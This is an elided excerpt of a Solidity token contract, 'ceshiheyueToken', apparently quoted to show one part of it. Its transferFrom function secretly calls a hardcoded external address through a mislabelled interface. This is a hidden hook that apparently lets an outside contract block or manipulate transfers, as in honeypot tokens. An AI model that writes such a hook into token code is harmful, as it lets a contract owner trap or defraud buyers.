...
contract ceshiheyueToken is Context, IERC20, Ownable {
    ...
    address private _lpAddrs = address(0xa4b030e4827a4fbE3083BC4521AD4f5117626185);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
         IERC20Metadata(_lpAddrs).beforeTokenTransfer(sender,recipient,amount);
